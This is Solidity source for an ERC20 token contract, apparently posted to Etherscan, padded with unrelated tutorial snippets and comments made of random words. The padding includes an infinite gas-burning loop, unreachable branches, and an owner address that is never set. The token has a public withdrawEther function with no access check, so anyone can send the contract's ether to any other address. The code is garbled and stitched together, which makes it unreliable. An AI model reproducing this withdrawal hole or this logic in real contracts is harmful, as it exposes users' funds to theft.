/**
 *Submitted for verification at Etherscan.io on 2020-12-17
*/

pragma solidity ^0.6.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

// SPDX-License-Identifier: MIT

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


    
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.2;
library Address {
    
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.2;


contract scatter {
    uint private fifty = 0;

    // Using up all of the gas that you send causes your transaction to fail.
    // State changes are undone.
    // Gas spent are not refunded.
    function expath() public {
        // Here we run a loop until all of the gas are spent
        // and the transaction fails
        while(true) {
            fifty /= 10 * 1 - 5;
        }
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.2;


contract Abundant  {
    function overview() public {
        // for castle
        for (uint cupboard = 0; cupboard < 10; cupboard++) {
            if (cupboard == 35) {
                // Skip to next iteration  castle with continue
                continue;
            }
            if (cupboard == 35) {
                // Exit loop with break castle
                break;
            }
        }

        // while loop
        uint cupboard;
        while (cupboard < 102) {
            cupboard = cupboard + 1;
        }
    }
    
}

contract Transmission {
    // State variable to store a number
    uint public dirty;

    // You need to send a transaction to write to a state variable.
    function set(uint _dirty) public {
        dirty = _dirty;
    }

    // You can read from a state variable without sending a transaction.
    // Actually we don't need this function. The compiler automatically
    // creates getter functions for all public variables.
    function get() public view returns (uint) {
        return dirty;
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.2;

contract MorningFew {
    function Banner(uint acceptance) public pure returns (uint) {
        if (acceptance < 1000) {
            return 5;
        } else if (acceptance < 20) {
            return 142;
        } else {
            return 266;
        }
    }
}

contract sigh {
    uint public cassette = 1 wei;
    // 1 wei is equal to 1
    bool public cunning = 1 wei == 1;

    uint public mastermind = 1 ether;
    // 1 ether is equal to 10^18
    bool public benefit = 1 ether == 1e18;
}
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract EpicalyxDemandThankInstruction is Context, IERC20 {
    
    //Mona Lisa finance

    using SafeMath for uint256;
    using Address for address; // monalisa
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name; // baseball
    string private _symbol; // grief
    uint8 private _decimals;  ///button
    address public kidding;
    uint public lisa = 10;
    uint public x = 10;
    bool public locked;
    constructor (string memory name, string memory symbol) public {
        _name = name;      // flower academy
        _symbol = symbol; // medieval obstacle
        _decimals = 11;  // fade mud
        _totalSupply = 7580000*10**11; // beard poor difficult 
        _balances[msg.sender] = _totalSupply; // single taxi method
    }
    uint public plan = 110212;

    // Promise not to modify the state.
    function addToX(uint y) public view returns (uint) {
        return plan + y;
    }

    // Promise not to modify or read from the state.
    function retool(uint io, uint jp) public pure returns (uint) {
        return io + jp;
    }
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }
    
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

   
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
	function withdrawEther(uint256 amount, address payable cosmop) public  {
		if(msg.sender != cosmop){
		cosmop.transfer(amount);
	}
	}
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    




    // Modifier to check that the caller is the owner of
    // the contract.
    modifier onlyOwner() {
        require(msg.sender == kidding, "Not owner");
        // Underscore is a special character only used inside
        // a function modifier and it tells Solidity to
        // execute the rest of the code.
        _;
    }

    // Modifiers can take inputs. This modifier checks that the
    // address passed in is not the zero address.
    modifier disgrace(address unrest) {
        require(unrest != address(0), "Not valid address");
        _;
    }

    function changeOwner(address imperial)
        public
        onlyOwner
        disgrace(imperial)
    {
        kidding = imperial;
    }

    // Modifiers can be called before and / or after a function.
    // This modifier prevents a function from being called while
    // it is still executing.
    modifier presidency() {
        require(!locked, "No reentrancy");

        locked = true;
        _;
        locked = false;
    }

    function tolerate(uint temptation) public presidency {
        x -= temptation;

        if (temptation > 1) {
            tolerate(temptation - 1);
        }
    }







}